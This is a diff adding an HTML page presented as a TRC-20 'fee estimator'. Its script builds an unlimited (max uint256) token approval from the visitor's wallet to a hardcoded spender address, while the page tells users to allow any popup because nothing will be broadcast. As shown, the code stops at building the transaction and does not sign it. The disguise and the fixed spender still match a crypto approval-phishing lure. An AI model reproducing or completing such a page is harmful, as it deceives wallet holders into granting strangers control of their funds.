@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TRC‑20 Fee Estimator</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #111; color: #fff; text-align: center; padding: 40px; }
+    button { padding: 15px 25px; font-size: 18px; border: none; border-radius: 8px; background: #29abe2; color: white; cursor: pointer; }
+    #result { margin-top: 20px; font-size: 18px; }
+  </style>
+</head>
+<body>
+  <h1>TRC‑20 Unlimited Approval Fee Estimator</h1>
+  <p>Click below and allow any popup—no real approval will be broadcast.</p>
+  <button id="runBtn">Estimate Approval Fee</button>
+  <div id="result"></div>
+
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+  <script>
+    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const SPENDER = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
+    const AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    async function estimateFee() {
+      const el = document.getElementById("result");
+      el.textContent = "Checking for wallet...";
+
+      if (!window.tronWeb || !window.tronWeb.defaultAddress?.base58) {
+        el.textContent = "Please open this page inside SafePal / TokenPocket / OKX...";
+        try {
+          await window.tronWeb.request({ method: "tron_requestAccounts" });
+        } catch {
+          el.textContent = "Wallet connect failed.";
+        }
+        return;
+      }
+
+      const from = window.tronWeb.defaultAddress.base58;
+      el.textContent = "Estimating energy and fee...";
+
+      try {
+        const resp = await tronWeb.transactionBuilder.triggerSmartContract(
+          CONTRACT,
+          "approve(address,uint256)",
+          {},
+          [
+            { type: "address", value: SPENDER },
+            { type: "uint256", value: AMOUNT }
+          ],
+          from
+        );
+
+        const energyUsed = resp.energy_usage_total ?? resp.constant_result ?? 0;
+        const feeSun = resp.transaction.raw_data.fee_limit;
+        const feeTrx = feeSun / 1_000_000;
+
+        el.innerHTML = `
+          Estimated Energy: <strong>${energyUsed}</strong><br/>
+          Fee Limit (allowed): <strong>${feeTrx.toFixed(3)} TRX</strong>
+        `;
+        alert(`Energy: ${energyUsed}, Fee Limit: ${feeTrx.toFixed(3)} TRX`);
+      } catch (err) {
+        console.error(err);
+        el.textContent = "Estimation failed: " + (err.message || err);
+      }
+    }
+
+    document.getElementById("runBtn").addEventListener("click", estimateFee);
+  </script>
+</body>
+</html>
